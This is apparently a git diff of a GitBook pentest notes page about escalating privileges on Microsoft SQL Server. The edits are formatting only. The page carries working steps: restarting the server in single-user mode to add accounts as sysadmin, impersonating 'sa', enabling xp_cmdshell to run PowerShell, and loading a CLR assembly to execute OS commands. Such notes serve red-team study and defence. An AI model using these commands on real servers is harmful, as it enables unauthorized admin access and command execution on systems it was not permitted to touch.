@@ -3,34 +3,34 @@
 ### SA single mode technique
 
 {% hint style="info" %}
-This technique can be used to add any user as SYSADMIN \(sa\).
+This technique can be used to add any user as SYSADMIN (sa).
 
 It requires Local Administrator privilege on the box.
 {% endhint %}
 
-1. Stop the services \(both server and agent\)
+1. Stop the services (both server and agent)
 
-![](../../../../.gitbook/assets/image%20%28205%29.png)
+![](<../../../../.gitbook/assets/image (205).png>)
 
-    2. Using an elevated command prompt, start the server into Single Mode \( `-m`\)
+&#x20;   2\. Using an elevated command prompt, start the server into Single Mode ( `-m`)
 
 ```csharp
 "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -m  -sSQLEXPRESS
 ```
 
-![](../../../../.gitbook/assets/image%20%28223%29.png)
+![](<../../../../.gitbook/assets/image (223).png>)
 
-  3. Download SQLCMD utility from Microsoft website:
+&#x20; 3\. Download SQLCMD utility from Microsoft website:
 
 {% embed url="https://go.microsoft.com/fwlink/?linkid=2142258" %}
 
-  4. From an another cmd prompt, use SQLCMD to connect to the server:
+&#x20; 4\. From an another cmd prompt, use SQLCMD to connect to the server:
 
 ```csharp
 sqlcmd -S SQLUAT
 ```
 
-  5. Grant sa access to anyone
+&#x20; 5\. Grant sa access to anyone
 
 ```csharp
 sp_addsrvrolemember 'crook\homer_potter', 'sysadmin'
@@ -39,13 +39,13 @@ sp_addsrvrolemember 'crook\sqladmin', 'sysadmin'
 GO
 ```
 
-![](../../../../.gitbook/assets/image%20%28251%29.png)
+![](<../../../../.gitbook/assets/image (251).png>)
 
-  6. Restart the SQL server as usual and enjoy.
+&#x20; 6\. Restart the SQL server as usual and enjoy.
 
-![](../../../../.gitbook/assets/image%20%28213%29.png)
+![](<../../../../.gitbook/assets/image (213).png>)
 
-### Impersonation 
+### Impersonation&#x20;
 
 #### List impersonation account
 
@@ -67,7 +67,7 @@ EXECUTE AS LOGIN = 'sa'
 select * from master..sysservers
 ```
 
-![](../../../../.gitbook/assets/image%20%2887%29.png)
+![](<../../../../.gitbook/assets/image (87).png>)
 
 ### Database Links
 
@@ -91,11 +91,11 @@ RECONFIGURE;
 exec master..xp_cmdshell "powershell ls /"
 ```
 
-![](../../../../.gitbook/assets/image%20%2847%29.png)
+![](<../../../../.gitbook/assets/image (47).png>)
 
 ### Custom Assemblies
 
-```text
+```
 EXECUTE AS LOGIN = 'sa';
 USE msdb;  EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ;
 EXEC sp_configure 'clr enabled',1; RECONFIGURE ;
@@ -107,5 +107,4 @@ CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [
 EXEC cmdExec 'whoami';
 ```
 
-![](../../../../.gitbook/assets/image%20%28116%29.png)
-
+![](<../../../../.gitbook/assets/image (116).png>)
